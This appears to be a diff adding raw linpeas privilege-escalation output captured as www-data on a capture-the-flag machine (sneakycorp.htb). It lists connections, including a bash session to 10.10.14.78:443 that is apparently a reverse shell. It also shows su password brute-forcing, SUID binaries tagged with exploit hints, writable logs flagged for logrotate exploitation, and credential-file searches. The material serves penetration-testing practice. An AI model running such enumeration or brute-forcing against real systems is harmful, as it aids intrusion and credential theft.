+tcp        0      0 127.0.0.1:56948         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:37756         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37800         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:56988         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:56964         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:57044         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:57036         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:48208         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37824         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:48160         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:57012         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:57020         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:37780         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:48256         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:56924         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:56916         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:48232         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37872         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37848         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:48236         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:48212         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:48164         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37804         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:48140         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37776         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37852         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37752         127.0.0.1:5000          TIME_WAIT   -
+tcp        0    209 10.10.10.197:37696      10.10.14.78:443         ESTABLISHED 5482/bash
+tcp        0      0 127.0.0.1:48188         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:56940         127.0.0.1:143           TIME_WAIT   -
+tcp6       0      0 :::993                  :::*                    LISTEN      -
+tcp6       0      0 :::143                  :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      747/nginx: worker p
+tcp6       0      0 :::8080                 :::*                    LISTEN      747/nginx: worker p
+tcp6       0      0 :::21                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::25                   :::*                    LISTEN      -
+tcp6       0      0 10.10.10.197:143        10.10.14.78:52038       ESTABLISHED -
+tcp6       0      0 127.0.0.1:143           127.0.0.1:56996         TIME_WAIT   -
+udp        0      0 10.10.10.197:45590      8.8.8.8:53              ESTABLISHED -
+
+[+] Can I sniff with tcpdump?
+No
+
+[+] Internet Access?
+icmp is not available
+Port 443 is not accessible
+Port 80 is not accessible
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[+] Do I have PGP keys?
+gpg Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/proc/sys/kernel/yama/ptrace_scope is enabled (0)
+gdb wasn't found in PATH
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+  Bruteforcing user root...
+  Bruteforcing user low...
+  Bruteforcing user developer...
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+developer:x:1001:1001:,,,:/var/www/dev.sneakycorp.htb:/bin/bash
+low:x:1000:1000:,,,:/home/low:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)
+uid=1001(developer) gid=1001(developer) groups=1001(developer)
+uid=101(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
+uid=105(avahi-autoipd) gid=112(avahi-autoipd) groups=112(avahi-autoipd)
+uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=107(ftp) gid=115(ftp) groups=115(ftp)
+uid=108(postfix) gid=116(postfix) groups=116(postfix)
+uid=109(courier) gid=118(courier) groups=118(courier)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=5(games) gid=60(games) groups=60(games)
+uid=5000(vmail) gid=5000(vmail) groups=5000(vmail)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=998(pypi) gid=998(pypi) groups=998(pypi),119(pypi-pkg)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+
+[+] Login now
+ 14:05:14 up  2:02,  0 users,  load average: 2.82, 1.16, 0.47
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+reboot   system boot  4.19.0-9-amd64   Thu May 14 13:20 - 14:55  (01:34)
+low      pts/0        192.168.56.1     Thu May 14 13:00 - 13:18  (00:17)
+low      tty1                          Thu May 14 12:58 - down   (00:19)
+reboot   system boot  4.19.0-9-amd64   Thu May 14 12:58 - 13:18  (00:19)
+low      tty1                          Thu May 14 12:55 - down   (00:03)
+reboot   system boot  4.19.0-9-amd64   Thu May 14 12:54 - 12:58  (00:04)
+low      tty1                          Thu May 14 05:47 - down   (00:01)
+reboot   system boot  4.19.0-9-amd64   Thu May 14 05:47 - 05:49  (00:01)
+
+wtmp begins Thu May 14 05:47:50 2020
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             tty1                      Fri Jul  3 08:33:54 -0400 2020
+low              pts/0    192.168.56.105   Tue Jun  9 03:02:52 -0400 2020
+developer        pts/1    192.168.56.105   Thu May 14 17:24:06 -0400 2020
+
+[+] Password policy
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql Not Found
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+Found readable /etc/mysql/my.cnf
+[client-server]
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mariadb.conf.d/
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+ Not Found
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+mongo binary Not Found
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+rsyncd.conf Not Found
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+/home/low/.ssh/authorized_keys
+ChallengeResponseAuthentication no
+UsePAM yes
+  --> Some certificates were found (out limited):
+/var/spool/postfix/etc/ssl/certs/ca-certificates.crt
+
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+No Sockets found in /run/screen/S-www-data.
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+[+] Searching Keyring files
+Keyring folder: /usr/lib/python3/dist-packages/keyrings
+/usr/lib/python3/dist-packages/keyrings:
+total 4
+drwxr-xr-x 3 root root 4096 May 14  2020 alt
+
+/usr/lib/python3/dist-packages/keyrings/alt:
+total 80
+-rw-r--r-- 1 root root  4509 Dec 16  2018 Gnome.py
+-rw-r--r-- 1 root root 12414 Dec 16  2018 Google.py
+-rw-r--r-- 1 root root  5413 Dec 16  2018 Windows.py
+-rw-r--r-- 1 root root     0 Dec 16  2018 __init__.py
+drwxr-xr-x 2 root root  4096 May 14  2020 __pycache__
+-rw-r--r-- 1 root root  3474 Dec 16  2018 _win_crypto.py
+-rw-r--r-- 1 root root  1363 Dec 16  2018 escape.py
+-rw-r--r-- 1 root root  7706 Dec 16  2018 file.py
+-rw-r--r-- 1 root root  6716 Dec 16  2018 file_base.py
+-rw-r--r-- 1 root root  2953 Dec 16  2018 keyczar.py
+-rw-r--r-- 1 root root  2187 Dec 16  2018 multi.py
+-rw-r--r-- 1 root root  9918 Dec 16  2018 pyfs.py
+
+/usr/lib/python3/dist-packages/keyrings/alt/__pycache__:
+total 72
+-rw-r--r-- 1 root root 3538 May 14  2020 Gnome.cpython-37.pyc
+-rw-r--r-- 1 root root 9139 May 14  2020 Google.cpython-37.pyc
+-rw-r--r-- 1 root root 5667 May 14  2020 Windows.cpython-37.pyc
+-rw-r--r-- 1 root root  142 May 14  2020 __init__.cpython-37.pyc
+-rw-r--r-- 1 root root 2509 May 14  2020 _win_crypto.cpython-37.pyc
+-rw-r--r-- 1 root root 1636 May 14  2020 escape.cpython-37.pyc
+-rw-r--r-- 1 root root 6957 May 14  2020 file.cpython-37.pyc
+-rw-r--r-- 1 root root 6037 May 14  2020 file_base.cpython-37.pyc
+-rw-r--r-- 1 root root 3519 May 14  2020 keyczar.cpython-37.pyc
+-rw-r--r-- 1 root root 2490 May 14  2020 multi.cpython-37.pyc
+-rw-r--r-- 1 root root 8197 May 14  2020 pyfs.cpython-37.pyc
+Keyring folder: /usr/share/keyrings
+/usr/share/keyrings:
+total 132
+-rw-r--r-- 1 root root  8132 Apr 23  2019 debian-archive-buster-automatic.gpg
+-rw-r--r-- 1 root root  8141 Apr 23  2019 debian-archive-buster-security-automatic.gpg
+-rw-r--r-- 1 root root  2332 Apr 23  2019 debian-archive-buster-stable.gpg
+-rw-r--r-- 1 root root  5106 Apr 23  2019 debian-archive-jessie-automatic.gpg
+-rw-r--r-- 1 root root  5115 Apr 23  2019 debian-archive-jessie-security-automatic.gpg
+-rw-r--r-- 1 root root  2763 Apr 23  2019 debian-archive-jessie-stable.gpg
+-rw-r--r-- 1 root root 48747 Apr 23  2019 debian-archive-keyring.gpg
+-rw-r--r-- 1 root root 23889 Apr 23  2019 debian-archive-removed-keys.gpg
+-rw-r--r-- 1 root root  7443 Apr 23  2019 debian-archive-stretch-automatic.gpg
+-rw-r--r-- 1 root root  7452 Apr 23  2019 debian-archive-stretch-security-automatic.gpg
+-rw-r--r-- 1 root root  2263 Apr 23  2019 debian-archive-stretch-stable.gpg
+
+[+] Searching Filezilla sites file
+
+[+] Searching backup-manager files
+
+[+] Searching uncommon passwd files (splunk)
+backup-manager file: /etc/cron.daily/passwd
+backup-manager file: /etc/pam.d/passwd
+backup-manager file: /usr/bin/passwd
+backup-manager file: /usr/share/bash-completion/completions/passwd
+backup-manager file: /usr/share/lintian/overrides/passwd
+
+[+] Searching GitLab related files
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root        35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root        63K Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root        51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-- 1 root messagebus  50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root       154K Feb  2  2020 /usr/bin/sudo  --->  /sudo$
+-rwsr-xr-x 1 root root        35K Apr 22  2020 /usr/bin/fusermount
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root utmp      10K Feb 18  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root mail      19K Dec  3  2017 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root tty       15K May  4  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow    31K Jul 27  2018 /usr/bin/expiry
+-rwxr-sr-x 1 root shadow    71K Jul 27  2018 /usr/bin/chage
+-rwxr-sr-x 1 root mlocate   39K Nov 14  2018 /usr/bin/mlocate
+-rwxr-sr-x 1 root tty       35K Jan 10  2019 /usr/bin/wall
+-rwxr-sr-x 1 root shadow    39K Feb 14  2019 /usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root root      15K Mar 14  2019 /usr/bin/dotlock.mailutils
+-rwxr-sr-x 1 root crontab   43K Oct 11  2019 /usr/bin/crontab
+-rwxr-sr-x 1 root ssh      315K Jan 31  2020 /usr/bin/ssh-agent
+-r-xr-sr-x 1 root postdrop  23K Mar 16  2020 /usr/sbin/postqueue
+-r-xr-sr-x 1 root postdrop  19K Mar 16  2020 /usr/sbin/postdrop
+
+[+] Checking misconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
+/usr/lib/x86_64-linux-gnu/libfakeroot
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Shell capabilities:
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Files with capabilities:
+/usr/bin/ping = cap_net_raw+ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+[+] Unexpected folders in root
+/lost+found
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 12
+drwxr-xr-x  2 root root 4096 May 14  2020 .
+drwxr-xr-x 87 root root 4096 Jun 22  2020 ..
+-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home
+/home/low/user.txt
+/home/low/.bash_history
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/auth.log
+/var/log/user.log
+/var/log/nginx/access.log
+/var/log/messages
+/tmp/linpeas.txt
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+logrotate 3.14.0
+
+    Default mail command:       /usr/bin/mail
+    Default compress command:   /bin/gzip
+    Default uncompress command: /bin/gunzip
+    Default compress extension: .gz
+    Default state file path:    /var/lib/logrotate/status
+    ACL support:                yes
+    SELinux support:            yes
+Writable: /var/log/nginx/access.log.12.gz
+Writable: /var/log/nginx/error.log.4.gz
+Writable: /var/log/nginx/access.log
+
+[+] Files inside /var/www (limit 20)
+total 24
+drwxr-xr-x  6 root root 4096 May 14  2020 .
+drwxr-xr-x 12 root root 4096 May 14  2020 ..
+drwxr-xr-x  3 root root 4096 Jun 23  2020 dev.sneakycorp.htb
+drwxr-xr-x  2 root root 4096 May 14  2020 html
+drwxr-xr-x  4 root root 4096 May 15  2020 pypi.sneakycorp.htb
+drwxr-xr-x  8 root root 4096 Jun 23  2020 sneakycorp.htb
+
+[+] Files inside others home (limit 20)
+/home/low/user.txt
+/home/low/.bash_logout
+/home/low/.bashrc
+/home/low/venv/bin/activate
+/home/low/venv/bin/pip
+/home/low/venv/bin/easy_install-3.7
+/home/low/venv/bin/easy_install
+/home/low/venv/bin/chardetect
+/home/low/venv/bin/activate.csh
+/home/low/venv/bin/activate.fish
+/home/low/venv/bin/pip3.7
+/home/low/venv/bin/pip3
+/home/low/venv/lib/python3.7/site-packages/pkg_resources-0.0.0.dist-info/RECORD
+/home/low/venv/lib/python3.7/site-packages/pkg_resources-0.0.0.dist-info/METADATA
+/home/low/venv/lib/python3.7/site-packages/pkg_resources-0.0.0.dist-info/AUTHORS.txt
+/home/low/venv/lib/python3.7/site-packages/pkg_resources-0.0.0.dist-info/WHEEL
+/home/low/venv/lib/python3.7/site-packages/pkg_resources-0.0.0.dist-info/INSTALLER
+/home/low/venv/lib/python3.7/site-packages/pkg_resources-0.0.0.dist-info/LICENSE.txt
+/home/low/venv/lib/python3.7/site-packages/chardet/langbulgarianmodel.py
+/home/low/venv/lib/python3.7/site-packages/chardet/jisfreq.py
+
+[+] Searching installed mail applications
+courier-config
+deliverquota.courier
+maildirmake.courier
+makedat.courier
+courier
+postfix
+postfix
+postfix-add-filter
+postfix-add-policy
+sendmail
+courier-config
+deliverquota.courier
+maildirmake.courier
+makedat.courier
+postfix
+postfix-add-filter
+postfix-add-policy
+sendmail
+
+[+] Mails (limit 50)
+
+[+] Backup files?
+-rw-r--r-- 1 root root 43736 Oct  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 9716 Apr 29  2020 /usr/lib/modules/4.19.0-9-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 9716 Apr 27  2020 /usr/lib/modules/4.19.0-8-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
+-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz
+
+[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found: /var/lib/mlocate/mlocate.db: regular file, no read permission
+Found: /var/lib/postfix/smtp_scache.db: regular file, no read permission
+Found: /var/lib/postfix/smtpd_scache.db: regular file, no read permission
+Found: /var/www/pypi.sneakycorp.htb/.htpasswd /etc/aliases.db: cannot open `/var/www/pypi.sneakycorp.htb/.htpasswd /etc/aliases.db' (No such file or directory)
+Found: /etc/postfix/virtual/maps.db: Berkeley DB (Hash, version 9, native byte-order)
+
+[+] Web files?(output limit)
+/var/www/:
+total 24K
+drwxr-xr-x  6 root root 4.0K May 14  2020 .
+drwxr-xr-x 12 root root 4.0K May 14  2020 ..
+drwxr-xr-x  3 root root 4.0K Jun 23  2020 dev.sneakycorp.htb
+drwxr-xr-x  2 root root 4.0K May 14  2020 html
+drwxr-xr-x  4 root root 4.0K May 15  2020 pypi.sneakycorp.htb
+drwxr-xr-x  8 root root 4.0K Jun 23  2020 sneakycorp.htb
+
+/var/www/dev.sneakycorp.htb:
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc
+-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
+-rw-r--r-- 1 low low 3526 May 14  2020 /home/low/.bashrc
+-rw-r--r-- 1 low low 807 May 14  2020 /home/low/.profile
+-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
+-rw-r--r-- 1 www-data www-data 93928 Feb 26 14:05 /tmp/linpeas.txt
+-rw-r--r-- 1 www-data www-data 111005 Feb 26 13:56 /tmp/lse.txt
+-rwxr-xr-x 1 www-data www-data 40580 Nov 28 06:51 /tmp/lse.sh
+-rwxr-xr-x 1 www-data www-data 300193 Nov 28 06:51 /tmp/linpeas.sh
+-rw-r--r-- 1 root root 152435 Jun 22  2020 /var/backups/dpkg.status.1.gz
+-rw-r--r-- 1 root root 186 May 14  2020 /var/backups/dpkg.diversions.0
+-rw-r--r-- 1 root root 61440 May 14  2020 /var/backups/alternatives.tar.0
+-rw-r--r-- 1 root root 152435 Jun 22  2020 /var/backups/dpkg.status.3.gz
+-rw-r--r-- 1 root root 304 Jun 22  2020 /var/backups/dpkg.statoverride.3.gz
+-rw-r--r-- 1 root root 558020 Jun 22  2020 /var/backups/dpkg.status.0
+-rw-r--r-- 1 root root 152435 Jun 22  2020 /var/backups/dpkg.status.4.gz
+-rw-r--r-- 1 root root 304 Jun 22  2020 /var/backups/dpkg.statoverride.6.gz
+-rw-r--r-- 1 root root 152435 Jun 22  2020 /var/backups/dpkg.status.2.gz
+-rw-r--r-- 1 root root 304 Jun 22  2020 /var/backups/dpkg.statoverride.1.gz
+-rw-r--r-- 1 root root 126 May 14  2020 /var/backups/dpkg.diversions.1.gz
+-rw-r--r-- 1 root root 126 May 14  2020 /var/backups/dpkg.diversions.5.gz
+-rw-r--r-- 1 root root 126 May 14  2020 /var/backups/dpkg.diversions.6.gz
+-rw-r--r-- 1 root root 1984 May 19  2020 /var/backups/apt.extended_states.1.gz
+-rw-r--r-- 1 root root 23764 Jun  9  2020 /var/backups/apt.extended_states.0
+-rw-r--r-- 1 root root 126 May 14  2020 /var/backups/dpkg.diversions.4.gz
+-rw-r--r-- 1 root root 304 Jun 22  2020 /var/backups/dpkg.statoverride.4.gz
+-rw-r--r-- 1 root root 304 Jun 22  2020 /var/backups/dpkg.statoverride.2.gz
+-rw-r--r-- 1 root root 304 Jun 22  2020 /var/backups/dpkg.statoverride.5.gz
+-rw-r--r-- 1 root root 152435 Jun 22  2020 /var/backups/dpkg.status.6.gz
+-rw-r--r-- 1 root root 126 May 14  2020 /var/backups/dpkg.diversions.2.gz
+-rw-r--r-- 1 root root 654 Jun 22  2020 /var/backups/dpkg.statoverride.0
+-rw-r--r-- 1 root root 152435 Jun 22  2020 /var/backups/dpkg.status.5.gz
+-rw-r--r-- 1 root root 126 May 14  2020 /var/backups/dpkg.diversions.3.gz
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/run/lock
+/run/php
+/run/screen
+/run/screen/S-www-data
+/tmp
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+#)You_can_write_even_more_files_inside_last_directory
+/var/lib/nginx/body
+/var/lib/nginx/fastcgi
+/var/lib/nginx/proxy
+/var/lib/nginx/scgi
+/var/lib/nginx/uwsgi
+/var/lib/php/sessions
+/var/log/nginx/access.log
+/var/log/nginx/access.log.1
+/var/log/nginx/access.log.10.gz
+/var/log/nginx/access.log.11.gz
+/var/log/nginx/access.log.12.gz
+#)You_can_write_even_more_files_inside_last_directory
+/var/tmp
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group www-data:
+
+
+[+] Searching passwords in config PHP files
